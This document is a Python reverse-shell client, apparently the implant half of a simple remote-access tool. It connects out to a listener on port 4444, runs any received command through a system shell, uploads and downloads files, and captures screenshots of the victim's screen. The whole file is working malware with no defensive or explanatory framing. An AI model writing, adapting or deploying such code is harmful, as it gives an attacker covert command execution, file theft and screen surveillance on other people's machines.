import socket
import json
import subprocess
import os
import pyautogui


class Connection:
    def __init__(self, host, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((host, port))

    def send(self, data):
        jsondata = json.dumps(data)
        self.sock.send(jsondata.encode())

    def recv(self):
        data = ''
        
        while True:
            try:
                data += self.sock.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                continue

    def upload_file(self, file):
        with open(file, 'rb') as f:
            self.sock.send(f.read())

    def download_file(self, file):
        with open(file, 'wb') as f:
            self.sock.settimeout(5)
            chunk = self.sock.recv(1024)

            while chunk:
                f.write(chunk)
                try:
                    chunk = self.sock.recv(1024)
                except socket.timeout:
                    break

            self.sock.settimeout(None)


class Shell:
    def __init__(self, connection):
        self.connection = connection

    def execute(self):
        while True:
            comm = self.connection.recv()

            if comm == 'exit':
                break
            elif comm == 'clear':
                os.system('clear')
            elif comm.startswith('cd '):
                self.change_directory(comm[3:])
            elif comm.startswith('upload '):
                self.connection.download_file(comm[7:])
            elif comm.startswith('download '):
                self.connection.upload_file(comm[9:])
            elif comm == 'screenshot':
                self.take_screenshot()
            elif comm == 'help':
                self.show_help()
            else:
                self.execute_command(comm)

    def change_directory(self, path):
        try:
            os.chdir(path)
            self.connection.send(f'Changed directory to {os.getcwd()}')
        except FileNotFoundError as e:
            self.connection.send(str(e))

    def take_screenshot(self):
        screenshot = pyautogui.screenshot()
        screenshot.save('screen.png')
        self.connection.upload_file('screen.png')
        os.remove('screen.png')

    def execute_command(self, command):
        exe = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = exe.stdout.read() + exe.stderr.read()
        self.connection.send(output.decode())

    @staticmethod
    def show_help():
        help_text = '''
        exit: Close the shell.
        clear: Clear the terminal.
        cd <directory>: Change the current directory.
        upload <file>: Upload a file to the server.
        download <file>: Download a file from the server.
        screenshot: Take a screenshot and upload it.
        help: Show this help message.
        '''
        print(help_text)


if __name__ == "__main__":
    conn = Connection('127.0.0.1', 4444)
    shell = Shell(conn)
    shell.execute()